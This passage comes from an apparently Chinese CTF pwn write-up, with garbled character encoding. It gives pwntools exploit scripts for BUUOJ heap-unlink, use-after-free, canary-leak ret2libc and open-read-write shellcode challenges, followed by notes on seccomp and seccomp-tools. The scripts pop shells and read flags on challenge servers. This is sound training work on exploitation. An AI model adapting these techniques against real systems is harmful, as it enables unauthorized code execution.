class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf=ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br>sh = remote(<span class="hljs-string">&quot;slkdfjsldkf&quot;</span>, <span class="hljs-number">932487</span>)<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system_plt=elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>context.binary = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>ptr=<span class="hljs-number">0x6020e8</span><span class="hljs-comment"># heaparray[1]çš„æŒ‡é’ˆçš„åœ°å€</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Size of Heap : &quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Content of heap:&quot;</span>)<br>    sh.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, size, content</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Size of Heap : &quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Content of heap : &quot;</span>)<br>    sh.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><span class="hljs-comment">#åˆ›å»ºä¸‰ä¸ªchunk</span><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)<br>payload+=p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#ä½¿ç”¨unlinkä¿®æ”¹heaparray</span><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(free_got)<br>payload+=p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>sh.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>sh.interactive()<br></code></pre></div></td></tr></table></figure><ul><li>æœ€å¦™ä¹‹å¤„åœ¨äºå°†free_gotæ”¹ä¸ºsystem_got, ç„¶ååˆå› ä¸ºfreeå’Œsysteméƒ½æ˜¯æŒ‡é’ˆç±»å‹, åªè¦ä¼ªé€ ä¸€ä¸ªå­—ç¬¦ä¸²æŒ‡é’ˆå°±å¯ä»¥ç”¨freeæ¥æ‰§è¡Œsystem</li><li>ä¸»è¦æ­¥éª¤:<ul><li>åœ¨chunk1çš„user dateé‡Œé€ ä¸€ä¸ªfake chunk header, æ³¨æ„åˆ°chunk2çš„PREV_SIZEè¢«ä¿®æ”¹ä¸º20, inuse_bitä¸º0, ä»¥åŠè®¾ç½®â€ç©ºâ€chunkçš„fdå’ŒbkæŒ‡é’ˆ, ä»¥é¿å¼€FD-&gt;bk == BK-&gt;fd == victimçš„æ£€æŸ¥</li><li>è¿™æ ·é‡Šæ”¾chunk2ä¹‹åunlinkå°±ä¼šä½¿ç”¨<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code>åå‘åˆå¹¶, chunk1çš„user dateå˜æˆå¦ä¸€ä¸ªchunk, å¹¶ä¿®æ”¹heaparray[1]ä¸ºFD(ptr-0x18)</li><li>å†æ¬¡ç¼–è¾‘chunk1, ç”±äºheaparray[1]å·²ç»æŒ‡å‘ptr-0x18, æ‰€ä»¥å¡«å……ä¸¤ä¸ª64ä½0, å°†[0]è¦†ç›–ä¸ºfree_gotè¡¨çš„åœ°å€, [1]æŒ‡å‘FD, [2]æŒ‡å‘å8å­—èŠ‚çš„â€bin/shâ€</li><li>ç¼–è¾‘heaparray[0], ä¿®æ”¹free_gotçš„å€¼ä¸ºsystem_got</li><li>ç„¶ådelete(2), è¿™æ—¶è°ƒç”¨system_got, å‚æ•°æ˜¯å­˜å‚¨åœ¨è¯¥ä½ç½®çš„æŒ‡é’ˆ, å€¼ä¸ºbinshçš„åœ°å€, æˆåŠŸæ‰§è¡Œ</li></ul></li></ul><img src="https://i.loli.net/2021/08/19/VePjdSGNFOpEM6o.png" alt="654" style="zoom:50%;" /> <h2 id="16-hacknote"><a href="#16-hacknote" class="headerlink" title="16.hacknote"></a>16.hacknote</h2><p>æ¯”è¾ƒç®€å•çš„ä¸€é“heapé¢˜, ä¸»è¦æ˜¯UAF</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./hacknote&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29324</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>  r.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br>add(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>mag = elf.sym[<span class="hljs-string">&quot;magic&quot;</span>]<br>add(<span class="hljs-number">12</span>, p32(mag)) <span class="hljs-comment">#2</span><br>printf(<span class="hljs-number">1</span>)<br>r.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="17-bjdctf-2020-babyrop2"><a href="#17-bjdctf-2020-babyrop2" class="headerlink" title="17.bjdctf_2020_babyrop2"></a>17.bjdctf_2020_babyrop2</h2><p>è¿™é¢˜æ˜¯leak canary + return2libc, è¿™ä¸ªå€¼å¥½åƒä¸ä¼šå˜å‘, æˆ‘å†å»æŸ¥æŸ¥</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./bjdctf_2020_babyrop2&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29934</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./bjdctf_2020_babyrop2&quot;</span>)<br><span class="hljs-comment">#</span><br>elf = ELF(<span class="hljs-string">&quot;./bjdctf_2020_babyrop2&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>vuln = elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400993</span><br><br>sla(<span class="hljs-string">&#x27;u!\n&#x27;</span>, <span class="hljs-string">&#x27;%7$p&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(rn(<span class="hljs-number">18</span>), <span class="hljs-number">16</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>payload += flat([pop_rdi_ret, puts_got, puts_plt, vuln])<br>sla(<span class="hljs-string">&#x27;ry!\n&#x27;</span>, payload)<br><br>puts_addr = u64(rn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>payload += flat([pop_rdi_ret, binsh, sys])<br>sl(payload)<br>sl(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="18-pwnable-orw"><a href="#18-pwnable-orw" class="headerlink" title="18.pwnable_orw"></a>18.pwnable_orw</h2><p>çœ‹ä¸Šå»åƒæ˜¯å¾ˆç®€å•çš„shellcraft, ä½†æ˜¯ç¬¬ä¸€ä¸ªå‡½æ•°å°±æœ‰ç‚¹ç‰¹åˆ«äº†:</p><p><img src="https://i.loli.net/2021/09/14/vONRPQkUxKWjALD.png" alt="image-20210914223414394"></p><ul><li>seccomp()å‡½æ•°æŸ¥çœ‹</li><li>ä½¿ç”¨seccomp-tools:</li></ul><p><img src="https://i.loli.net/2021/09/14/oTh3rR9IzGwv6aC.png" alt="image-20210914223259160"></p><ul><li>çœ‹å‡ºä»…å¯ä½¿ç”¨open, read, writeè¿™å‡ ä¸ªæœ‰ç”¨çš„å‡½æ•°</li><li>exp: (<a href="https://cloud.tencent.com/developer/article/1815026">è¿™é‡Œæ˜¯æ‰‹å†™æ±‡ç¼–è°ƒç”¨syscall</a>)</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;node.buuoj.cn&#x27;</span>,<span class="hljs-number">25539</span>)<br><br>context.binary = <span class="hljs-string">&#x27;./orw&#x27;</span><br><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<span class="hljs-comment">#è¯»å–åˆ°æ ˆä¸­</span><br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<span class="hljs-comment">#æ‰“åœ¨æ ‡å‡†è¾“å‡ºä¸Š</span><br>shellcode = asm(shellcode)<br><br>sleep(<span class="hljs-number">0.2</span>)<span class="hljs-comment">#æ„ä¹‰ä¸æ˜</span><br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p><strong>æ–°æœºåˆ¶: seccomp</strong> </p><blockquote><p>seccomp æ˜¯ secure computing çš„ç¼©å†™ï¼Œå…¶æ˜¯ Linux kernel ä»2.6.23ç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§ç®€æ´çš„ sandboxing æœºåˆ¶ã€‚åœ¨ Linux ç³»ç»Ÿé‡Œï¼Œå¤§é‡çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ç›´æ¥æš´éœ²ç»™ç”¨æˆ·æ€ç¨‹åºã€‚ä½†æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨éƒ½è¢«éœ€è¦ï¼Œè€Œä¸”ä¸å®‰å…¨çš„ä»£ç æ»¥ç”¨ç³»ç»Ÿè°ƒç”¨ä¼šå¯¹ç³»ç»Ÿé€ æˆå®‰å…¨å¨èƒã€‚seccompå®‰å…¨æœºåˆ¶èƒ½ä½¿ä¸€ä¸ªè¿›ç¨‹è¿›å…¥åˆ°ä¸€ç§â€œå®‰å…¨â€è¿è¡Œæ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹çš„è¿›ç¨‹åªèƒ½è°ƒç”¨4ç§ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ï¼Œå³ read(), write(), exit() å’Œ sigreturn()ï¼Œå¦åˆ™è¿›ç¨‹ä¾¿ä¼šè¢«ç»ˆæ­¢ã€‚</p></blockquote><p><img src="https://i.loli.net/2021/09/13/ekGP6w4rBUmzyFn.png" alt="image-20210913162407923"></p><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†ä¸€ä¸ªæ–°çš„å‡½æ•°<code>prctl()</code>. å…·ä½“çš„<a href="https://www.man7.org/linux/man-pages/man2/prctl.2.html">LInux Man Page</a>å’Œ<a href="https://code.woboq.org/userspace/include/linux/prctl.h.html">optionä½¿ç”¨çš„å®å®šä¹‰</a>åœ¨æ­¤</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> option, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg3,</span></span><br><span class="hljs-params"><span class="hljs-function">                 <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg4, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg5)</span></span>;<br></code></pre></div></td></tr></table></figure><p>å¯¹äºç¬¬ä¸€ä¸ª<code>prctl()</code>, 38å°±æ˜¯<code>PR_SET_NO_NEW_PRIVS</code>, å› æ­¤å¯ä»¥æŸ¥åˆ°ä½œç”¨æ˜¯: </p><blockquote><p>set the calling threadâ€™s no_new_privs attribute to thevalue in <em>arg2</em>. With no_new_privs set to 1, execve(2)<br>promises not to grant privileges to do anything that couldnot have been done without the execve(2) call (for<br>example,rendering the set-user-ID and set-group-ID modebits,and file capabilities non-functional). Once set,the no_new_privs attribute cannot be unset. </p></blockquote><p>ç®€å•æ¥è¯´å°±æ˜¯ç¦ç”¨<code>execve()</code>å‡½æ•°ä»¥åŠä½¿ç”¨åˆ°<code>execve()</code>çš„å…¶ä»–å‡½æ•°</p><p>å¯¹äºç¬¬äºŒä¸ª<code>prctl()</code>, 22å°±æ˜¯<code>PR_SET_SECCOMP</code>, æŸ¥åˆ°çš„ä½œç”¨æ˜¯:</p><blockquote><p>Set the secure computing (seccomp) mode for the calling thread, to limit the available system calls.</p><p>With arg2 set to <strong>SECCOMP_MODE_STRICT</strong>(equals 1),the only systemcalls that the thread is permitted to make are <code>read</code>(2)ï¼Œ<code>write</code>(2)ï¼Œ<code>_exit</code>(2)(but not exit_group(2)), and <code>sigreturn</code>(2). Other system calls result in the deliveryof a <code>SIGKILL</code> signal. </p><p>With arg2 set to <strong>SECCOMP_MODE_FILTER</strong>(equals 2)(since Linux 3.5)ï¼Œthe system calls allowed are defined by a pointer to aBerkeley Packet Filter passed in arg3. <em>This argument is apointer to struct sock_fprog</em>; it can be designed to filterarbitrary system calls and system call arguments. </p></blockquote><p>å¦‚æœé€‰äº†SECCOMP_MODE_FILTER:</p><p>æˆ‘ä»¬å…ˆè§£é‡Šä¸€äº›åŸç†, ä¸€äº›ç¤ºä¾‹ç½‘ç«™åœ¨æ­¤ (<a href="https://blog.csdn.net/u013250169/article/details/115669655">seccomp1</a>) (<a href="https://www.jianshu.com/p/75e157cea215">seccomp2</a>) (<a href="https://linux.cn/article-9507-1.html">BPFä»‹ç»</a>) (<a href="https://www.cnblogs.com/honpey/p/8013073.html">BPFæŒ‡ä»¤é›†</a>):</p><ul><li>ä¸¤ä¸ªå…³é”®struct:</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Filter block */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> &#123;</span> <br>   __u16 code; <span class="hljs-comment">/* Actual filter code */</span> <br>   __u8 jt; <span class="hljs-comment">/* Jump true */</span><br>   __u8 jf; <span class="hljs-comment">/* Jump false */</span><br>   __u32 k; <span class="hljs-comment">/* Generic multiuse field */</span> <br>  <br>&#125;; <br><span class="hljs-comment">/* Required for SO_ATTACH_FILTER. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> &#123;</span> <br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> len; <span class="hljs-comment">/* Number of filter blocks */</span> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span> <br>&#125;;<br></code></pre></div></td></tr></table></figure><ol><li>codeå˜é‡æ¶‰åŠåˆ°äº†BPFè¿™ç§æŠ€æœ¯, è€ŒseccompæŠ€æœ¯å°±æ˜¯å€Ÿé‰´BPFçš„æºç , æ‰€ä»¥å¯ä»¥åˆ°BPFçš„æŒ‡ä»¤é›†ä¸­æ‰¾åˆ°è¿™ä¸ªå˜é‡çš„ç»„åˆæ–¹å¼, ç”¨ä¸€äº›ç¥å¥‡çš„æ‰‹æ®µæŠŠä¸€äº›instructionsç¼–ç è¿›u16ä¸­. </li><li>jtå’Œjfçš„æ„æ€è¾ƒä¸ºæ˜æ˜¾, å°±æ˜¯jump if true||false</li><li>kè£…å•¥éƒ½è¡Œ</li></ol><ul><li>ä½œç”¨åŸç†:</li></ul><blockquote><p>æ¯ä¸ªç³»ç»Ÿè°ƒç”¨éƒ½ä¼šé™·å…¥ç³»ç»Ÿè°ƒç”¨æ§åˆ¶å‡½æ•°syscall_trace_enterä¸­ï¼Œè¯¥å‡½æ•°ä¸­è°ƒç”¨äº†secure_computingï¼Œç³»ç»Ÿè°ƒç”¨å·ä½œä¸ºå‚æ•°ä¼ é€’ã€‚åœ¨__secure_computingå‡½æ•°ä¸­ï¼Œé€šè¿‡current-&gt;seccomp.modeæå–æ ‡å¿—ä½modeï¼Œå¦‚æœmodeä¸º1æˆ–è€…2ï¼Œåˆ™è¯´æ˜å½“å‰è¿›ç¨‹å·²ç»è®¾ç½®äº†seccompé™åˆ¶ã€‚å¦‚æœæ˜¯1(<strong>SECCOMP_MODE_STRICT</strong>)åˆ™å°±åªå…è®¸å››ä¸ªç³»ç»Ÿè°ƒç”¨, å¦‚æœæ˜¯2(<strong>SECCOMP_MODE_FILTER</strong>)å°±å¦‚ä¸Šé¢æ‰€ç¤º</p></blockquote><ul><li>æ•ˆæœ: å°±æ˜¯è‡ªå·±è®¾å®šæ¯ä¸€æ¡ç³»ç»Ÿè°ƒç”¨æ‰€å¯¹åº”çš„å¤„ç†æ–¹æ³•, æŸ¥è¯¢æ–¹å¼å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å·¥å…·, è‡ªå·±è®¾ç½®å¯ä»¥å°éƒ¨åˆ†å‚è€ƒâ†’<a href="https://blog.csdn.net/u013250169/article/details/115669655">è¿™é‡Œ</a>.</li></ul><p><strong>seccomp-tools</strong>ç”¨æ³•:(<a href="https://github.com/david942j/seccomp-tools">Github Page</a>)</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo gem install seccomp-tools<br>nevv@ubuntu:~/Desktop/seccomp-tools-master/bin$ seccomp-tools dump ../../pwn1<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 # line11<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 # 0011è¿™ä¸ªå°±æ˜¯å·¦è¾¹çš„æ ‡å·<br> 0004: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0011<br> 0005: 0x15 0x05 0x00 0x00000101  if (A == openat) goto 0011<br> 0006: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0011<br> 0007: 0x15 0x03 0x00 0x0000009d  if (A == prctl) goto 0011<br> 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011<br> 0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011<br> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0011: 0x06 0x00 0x00 0x00051234  return ERRNO(4660)  #æœ‰ä»»ä½•ä¸€ä¸ªä¸å…è®¸çš„ç³»ç»Ÿè°ƒç”¨å‡ºç°æ—¶å°±åå›errornumber<br></code></pre></div></td></tr></table></figure><h2 id="19-babyfengshui-33c3-2016"><a href="#19-babyfengshui-33c3-2016" class="headerlink" title="19.babyfengshui_33c3_2016"></a>19.babyfengshui_33c3_2016</h2><blockquote><p>åœ¨<a href="./glibc_malloc_srcCode.md#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0">æºä»£ç åˆ†æ</a>ä¸­çš„å…³é”®å‡½æ•°éƒ¨åˆ†æåˆ°è¿‡ä»å‡ ä¸ªåŠŸèƒ½å‡½æ•°æ¨æ–­å‡ºå­˜å‚¨çš„ç»“æ„ä½“, è¿™æ¬¡æˆ‘æ²¡æ³¨æ„åˆ°è¿™ä¸ªç»†èŠ‚, å±å®æ˜¯hacknoteè¿™é¢˜ç›´æ¥æºç çœ‹ä¸€éè‰è‰äº†äº‹, ä¸€äº›ç»†èŠ‚ç»™æˆ‘å¿½ç•¥äº†.</p><p>å–„ç”¨<code>gdb.attach()</code>, è¯´å®è¯è¿™æ ·å­çœ‹å †çš„ç»“æ„æ˜¯æœ€ä¸ºç›´è§‚çš„, ä½†æ˜¯æˆ‘åˆå¤§æ„äº†, ç¯å¢ƒå’ŒæœåŠ¡å™¨çš„ä¸ä¸€æ ·ä¹Ÿä¸èƒ½ç›´æ¥ç”¨</p><p>è¿˜æœ‰ä¸€ä»¶äº‹, å¯ä»¥æŠŠä¸€äº›è‡ªåŠ¨ç”Ÿæˆçš„åç§°æ”¹ä¸€ä¸‹, è¿™æ ·å­æ›´å¥½çœ‹æºä»£ç 